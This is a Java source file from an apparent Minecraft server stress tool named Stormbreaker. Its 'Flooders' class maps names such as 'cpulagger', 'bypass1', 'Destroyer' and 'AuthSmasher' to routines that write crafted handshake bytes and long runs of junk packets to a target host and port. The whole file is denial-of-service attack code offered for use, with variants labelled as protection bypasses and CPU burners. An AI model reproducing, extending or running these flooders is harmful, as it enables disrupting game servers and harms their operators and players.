package com.gabrielhd.Stormbreaker.flood;

import com.gabrielhd.Stormbreaker.helper.VarHelper;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class Flooders
{
    public static int LOOP_AMOUNT;
    private final Map<String, Flooder> flooders;
    
    static {
        Flooders.LOOP_AMOUNT = 1900;
    }
    
    public Flooders() {
        (this.flooders = new HashMap<>()).put("localhost", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(99);
            out.write(224);
            out.write(1);
            for (int i = 0; i < Flooders.LOOP_AMOUNT; ++i) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("bosshandler", (out, host, port) -> {
            out.write(0);
            out.write(17);
            out.write(19);
            out.write(21);
            out.write(0);
            out.write(-15);
            out.write(-17);
            out.write(-19);
            out.write(-21);
            out.write(1);
            out.write(1);
            out.write(0);
            out.write(1);
            out.write(0);
            out.write(1);
            for (int j = 0; j < Flooders.LOOP_AMOUNT; ++j) {
                out.write(0);
            }
        });
        this.flooders.put("cpulagger", (out, host, port) -> {
            out.write(0);
            out.write(17);
            out.write(19);
            out.write(21);
            out.write(0);
            out.write(-15);
            out.write(-17);
            out.write(-19);
            out.write(-21);
            out.write(1);
            out.write(1);
            out.write(0);
            out.write(1);
            out.write(0);
            out.write(1);
            for (int k = 0; k < Flooders.LOOP_AMOUNT; ++k) {
                out.write(0);
            }
        });
        this.flooders.put("test1", (out, host, port) -> {
            out.write(2147483547);
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes(host);
            out.write(99);
            out.write(223);
            out.write(2);
            for (int l = 0; l < Flooders.LOOP_AMOUNT; ++l) {
                out.write(2);
                out.write(0);
                out.write(0);
            }
        });
        this.flooders.put("test2", (out, host, port) -> {
            out.write(-15);
            out.write(0);
            out.write(-47);
            out.write(-9);
            out.writeBytes(host);
            out.write(-99);
            out.write(-224);
            out.write(-1);
            for (int m = 0; m < Flooders.LOOP_AMOUNT; ++m) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("flood1", (out, host, port) -> {
            out.write(0);
            out.write(47);
            out.write(20);
            out.write(109);
            out.writeBytes(host);
            out.write(99);
            out.write(45);
            out.write(50);
            out.write(50);
            out.write(55);
            out.write(55);
            out.write(46);
            out.write(114);
            out.write(97);
            out.write(122);
            out.write(105);
            out.write(120);
            out.write(112);
            out.write(118);
            out.write(112);
            out.write(46);
            out.write(100);
            out.write(101);
            out.write(46);
            out.write(99);
            out.write(-35);
            out.write(2);
            for (int i2 = 0; i2 < Flooders.LOOP_AMOUNT; ++i2) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("flood2", (out, host, port) -> {
            out.write(0);
            out.write(14);
            out.write(67);
            out.write(114);
            out.writeBytes(host);
            out.writeShort(port);
            out.write(97);
            out.write(115);
            out.write(104);
            out.write(69);
            out.write(120);
            out.write(99);
            out.write(101);
            out.write(112);
            out.write(116);
            out.write(105);
            out.write(111);
            out.write(110);
            for (int i3 = 0; i3 < Flooders.LOOP_AMOUNT; ++i3) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("spigot1", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes(host);
            out.write(99);
            out.write(224);
            out.write(1);
            for (int i4 = 0; i4 < Flooders.LOOP_AMOUNT; ++i4) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("spigot2", (out, host, port) -> {
            out.write(-15);
            out.write(0);
            out.write(-47);
            out.write(-9);
            out.writeBytes(host);
            out.write(-99);
            out.write(-224);
            out.write(-1);
            for (int i5 = 0; i5 < Flooders.LOOP_AMOUNT; ++i5) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("bypass1", (out, host, port) -> {
            out.write(1);
            out.write(0);
            out.write(0);
            out.write(0);
            out.write(10);
            out.write(125);
            out.write(-30);
            out.write(19);
            for (int i6 = 0; i6 < Flooders.LOOP_AMOUNT; ++i6) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("bypass2", (out, host, port) -> {
            out.write(-71);
            for (int i7 = 0; i7 < Flooders.LOOP_AMOUNT; ++i7) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("bypass3", (out, host, port) -> {
            out.write(0);
            out.write(14);
            out.write(67);
            out.write(114);
            out.writeBytes(host);
            out.write(97);
            out.write(115);
            out.write(104);
            out.write(69);
            out.write(120);
            out.write(99);
            out.write(101);
            out.write(112);
            out.write(116);
            out.write(105);
            out.write(111);
            out.write(110);
            for (int i8 = 0; i8 < Flooders.LOOP_AMOUNT; ++i8) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("extreme1", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(99);
            out.write(453);
            out.writeBytes(host);
            out.write(457);
            out.write(1);
            for (int i9 = 0; i9 < Flooders.LOOP_AMOUNT; ++i9) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("extreme2", (out, host, port) -> {
            out.write(535);
            out.write(456);
            out.write(12);
            out.write(52);
            out.writeBytes(host);
            out.write(367);
            out.write(1);
            for (int i10 = 0; i10 < Flooders.LOOP_AMOUNT; ++i10) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("extreme3", (out, host, port) -> {
            out.write(355);
            out.write(255);
            out.write(155);
            out.write(10);
            out.writeBytes(host);
            out.write(25);
            out.write(1);
            for (int i11 = 0; i11 < Flooders.LOOP_AMOUNT; ++i11) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("extreme4", (out, host, port) -> {
            out.write(15);
            out.write(543);
            out.write(48);
            out.write(9);
            out.writeBytes(host);
            out.write(15);
            out.write(65);
            out.write(1);
            for (int i12 = 0; i12 < Flooders.LOOP_AMOUNT; ++i12) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("Extreme5", (out, host, port) -> {
            out.write(624);
            out.write(15);
            out.write(565);
            out.write(346);
            out.write(0);
            out.write(1);
            for (int i13 = 0; i13 < Flooders.LOOP_AMOUNT; ++i13) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("cpuburner1", (out, host, port) -> {
            out.write(0);
            out.write(47);
            out.write(4);
            out.write(99);
            out.write(-32);
            out.write(1);
            for (int i14 = 0; i14 < Flooders.LOOP_AMOUNT; ++i14) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("cpuburner2", (out, host, port) -> {
            out.write(0);
            out.write(47);
            out.write(13);
            out.write(52);
            out.write(53);
            out.write(46);
            out.write(56);
            out.write(57);
            out.write(46);
            out.write(49);
            out.write(52);
            out.write(49);
            out.write(46);
            out.write(49);
            out.write(52);
            out.write(54);
            out.write(99);
            out.write(-35);
            for (int i15 = 0; i15 < Flooders.LOOP_AMOUNT; ++i15) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("cpuburner3", (out, host, port) -> {
            out.write(2147483547);
            out.write(47);
            out.write(20);
            out.write(109);
            out.writeBytes(host);
            out.writeShort(port);
            out.write(99);
            out.write(45);
            out.write(50);
            out.write(50);
            out.write(55);
            out.write(55);
            out.write(46);
            out.write(114);
            out.write(97);
            out.write(122);
            out.write(105);
            out.write(120);
            out.write(112);
            out.write(118);
            out.write(112);
            out.write(46);
            out.write(100);
            out.write(101);
            out.write(46);
            out.write(99);
            out.write(-35);
            out.write(2);
            for (int i16 = 0; i16 < Flooders.LOOP_AMOUNT; ++i16) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("cpuburner4", (out, host, port) -> {
            out.write(118);
            out.write(119);
            out.write(121);
            out.write(119);
            out.write(52);
            out.write(119);
            out.write(69);
            out.write(70);
            out.write(79);
            out.write(89);
            out.write(64);
            out.write(89);
            out.write(70);
            out.write(64);
            out.write(70);
            out.write(89);
            out.write(78);
            out.write(70);
            out.write(123);
            out.write(79);
            out.write(22);
            out.write(4);
            out.write(31);
            out.write(50);
            out.write(15);
            out.write(20);
            out.write(18);
            out.write(7);
            out.write(3);
            out.write(30);
            out.write(24);
            out.write(25);
            for (int i17 = 0; i17 < Flooders.LOOP_AMOUNT; ++i17) {
                out.write(118);
                out.write(119);
            }
        });
        this.flooders.put("join", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(99);
            out.write(223);
            out.write(2);
            String nick = VarHelper.getRandomString(14);
            out.write(nick.length() + 2);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
        });
        this.flooders.put("a", (out, host, port) -> {
            out.write(0);
            out.write(0);
            out.write(67);
            out.write(0);
            out.write(114);
            out.write(0);
            out.write(49);
            out.write(57);
            out.write(51);
            out.write(46);
            out.write(51);
            out.write(50);
            out.write(46);
            out.write(54);
            out.write(46);
            out.write(31);
            out.write(-112);
            out.write(97);
            out.write(115);
            out.write(104);
            out.write(69);
            out.write(120);
            out.write(99);
            out.write(101);
            out.write(112);
            out.write(116);
            out.write(105);
            out.write(111);
            out.write(110);
            for (int i18 = 0; i18 < Flooders.LOOP_AMOUNT; ++i18) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("cpuburner6", (out, host, port) -> {
            out.write(0);
            out.write(47);
            out.write(13);
            out.write(52);
            out.write(53);
            out.write(46);
            out.write(56);
            out.write(57);
            out.write(46);
            out.write(49);
            out.write(52);
            out.write(49);
            out.write(46);
            out.write(49);
            out.write(52);
            out.write(54);
            out.write(99);
            out.write(-35);
            for (int i19 = 0; i19 < Flooders.LOOP_AMOUNT; ++i19) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("T1", (out, host, port) -> {
            out.write(2915);
            out.write(-34);
            out.write(8);
            out.write(0);
            out.write(35);
            out.write(456);
            out.write(12);
            out.write(52);
            out.writeBytes(host);
            out.write(367);
            out.write(1);
            for (int i = 0; i < 1500; ++i) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("T2", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(99);
            out.write(223);
            out.write(2);
        });
        this.flooders.put("cpuburner6", (out, host, port) -> {
            out.write(3);
            out.write(1);
            out.write(0);
            out.write(-69);
            out.write(1);
            out.write(0);
            out.write(0);
            out.write(-73);
            out.write(3);
            out.write(3);
            out.write(-53);
            out.write(-126);
            out.write(-82);
            out.write(83);
            out.write(21);
            out.write(-10);
            out.write(121);
            out.write(2);
            out.write(-62);
            out.write(11);
            out.write(-31);
            out.write(-62);
            out.write(106);
            out.write(-8);
            out.write(117);
            out.write(-23);
            out.write(50);
            out.write(35);
            out.write(60);
            out.write(57);
            out.write(3);
            out.write(63);
            out.write(-92);
            out.write(-57);
            out.write(-75);
            out.write(-120);
            out.write(80);
            out.write(31);
            out.write(46);
            out.write(101);
            out.write(33);
            out.write(0);
            out.write(0);
            out.write(72);
            out.write(0);
            out.write(47);
        });
        this.flooders.put("Destroyer", (out, host, port) -> {
            out.write(-15);
            out.write(0);
            out.write(-47);
            out.write(-9);
            out.write(-99);
            out.write(-224);
            out.write(-1);
        });
        this.flooders.put("ZeusSlapper", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(99);
            out.write(453);
            out.write(457);
            out.write(1);
            for (int i20 = 0; i20 < Flooders.LOOP_AMOUNT; ++i20) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("BypassHub1", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.write(99);
            out.write(224);
            out.write(1);
            out.write(0);
            out.write(14);
            out.write(67);
            out.write(114);
            out.write(97);
            out.write(115);
            out.write(104);
            out.write(69);
            out.write(120);
            out.write(99);
            out.write(101);
            out.write(112);
            out.write(116);
            out.write(105);
            out.write(111);
            out.write(110);
            out.write(-15);
            out.write(0);
            out.write(-47);
            out.write(-9);
            out.write(-99);
            out.write(-224);
            out.write(-1);
            out.write(1);
            out.write(0);
            out.write(0);
            out.write(0);
            out.write(10);
            out.write(125);
            out.write(-30);
            out.write(19);
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.write(99);
            out.write(224);
            out.write(1);
            out.write(150);
            out.write(0);
            out.write(990);
            out.write(4530);
            out.write(457);
            out.write(1);
            out.write(0);
            out.write(14);
            out.write(67);
            out.write(114);
            out.write(97);
            out.write(115);
            out.write(104);
            out.write(69);
            out.write(120);
            out.write(99);
            out.write(101);
            out.write(112);
            out.write(116);
            out.write(105);
            out.write(111);
            out.write(-15);
            out.write(0);
            out.write(-47);
            out.write(-9);
            out.write(-99);
            out.write(-224);
            out.write(-1);
            out.write(1);
            out.write(0);
            out.write(0);
            out.write(0);
            out.write(10);
            out.write(125);
            out.write(-30);
            out.write(19);
            for (int i21 = 0; i21 < 1900; ++i21) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("exceptionBypass", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(911);
            out.write(99);
            out.write(200);
            out.write(10);
            for (int i22 = 0; i22 < 1900; ++i22) {
                out.write(1);
                out.write(0);
            }
        });
        this.flooders.put("AuthSmasher", (out, host, port) -> {
            out.write(624);
            out.write(15);
            out.write(565);
            out.write(346);
            out.write(0);
            out.write(1);
            for (int i23 = 0; i23 < Flooders.LOOP_AMOUNT; ++i23) {
                out.write(1);
                out.write(0);
            }
        });
    }
    
    public Set<String> getFlooders() {
        return new HashSet<>(this.flooders.keySet());
    }
    
    public Flooder findById(String id) {
        return this.flooders.get(id);
    }
    
    @FunctionalInterface
    public interface Flooder
    {
        void flood(DataOutputStream p0, String p1, int p2) throws IOException;
    }
}
